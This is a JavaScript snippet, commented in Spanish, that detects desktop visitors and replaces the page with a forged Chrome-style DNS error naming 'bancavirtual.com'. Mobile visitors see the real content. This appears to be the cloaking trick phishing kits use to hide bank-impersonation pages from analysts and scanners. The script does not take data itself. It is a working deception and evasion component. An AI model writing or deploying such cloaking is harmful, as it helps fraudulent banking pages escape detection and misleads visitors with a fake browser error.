// Script para bloquear acceso desde computadores de escritorio
(function() {
    function isMobileDevice() {
        // Detectar por User Agent
        const userAgent = navigator.userAgent.toLowerCase();
        const mobileKeywords = ['android', 'iphone', 'ipod', 'ipad', 'blackberry', 'windows phone', 'opera mini', 'webos'];
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        
        // Detectar por tamaño de pantalla
        const screenWidth = window.innerWidth || screen.width;
        const isSmallScreen = screenWidth < 768;
        
        // Detectar por capacidad táctil
        const isTouchCapable = () => {
            return (('ontouchstart' in window) || 
                    (navigator.maxTouchPoints > 0) || 
                    (navigator.msMaxTouchPoints > 0));
        };
        
        return isMobileUA || (isSmallScreen && isTouchCapable());
    }

    function blockDesktop() {
        if (!isMobileDevice()) {
            document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>No se puede acceder a este sitio web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            width: 100%;
            height: 100%;
        }
        
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background: #2a2a2a;
            color: #9aa0a6;
            padding: 0;
            margin: 0;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 80px 20px 20px 20px;
        }
        
        .error-icon {
            width: 140px;
            height: 140px;
            margin: 0 auto 40px;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 400;
            color: #e8eaed;
            margin-bottom: 20px;
            letter-spacing: -0.5px;
        }
        
        .error-details {
            font-size: 15px;
            color: #9aa0a6;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .error-details strong {
            color: #e8eaed;
            font-weight: 500;
        }
        
        .error-code {
            font-size: 13px;
            color: #80868b;
            margin: 30px 0;
            letter-spacing: 0.5px;
            font-family: 'Roboto Mono', 'Courier New', monospace;
        }
        
        button {
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
        }
        
        button:hover {
            background: #aecbfa;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }
        
        button:active {
            background: #669df6;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="error-icon" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
            <g opacity="0.7">
                <!-- Icono de archivo con exclamación -->
                <rect x="50" y="40" width="60" height="75" rx="3" fill="none" stroke="#80868b" stroke-width="2"/>
                <line x1="80" y1="35" x2="80" y2="40" stroke="#80868b" stroke-width="2"/>
                <line x1="70" y1="35" x2="90" y2="35" stroke="#80868b" stroke-width="2"/>
                <circle cx="80" cy="85" r="10" fill="#80868b"/>
                <line x1="80" y1="77" x2="80" y2="83" stroke="#2a2a2a" stroke-width="2"/>
                <line x1="80" y1="88" x2="80" y2="94" stroke="#2a2a2a" stroke-width="2"/>
            </g>
        </svg>
        
        <h1>No se puede acceder a este sitio web</h1>
        
        <div class="error-details">
            No se ha podido encontrar la dirección DNS de la página <strong>bancavirtual.com</strong>. Se está diagnosticando el problema.
        </div>
        
        <div class="error-code">
            DNS_PROBE_POSSIBLE
        </div>
        
        <button onclick="location.reload()">Volver a cargar</button>
    </div>
</body>
</html>
            `;
        }
    }

    // Ejecutar cuando el DOM esté listo
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', blockDesktop);
    } else {
        blockDesktop();
    }
    
    // También verificar al cambiar tamaño
    window.addEventListener('resize', function() {
        setTimeout(blockDesktop, 500);
    });
})();
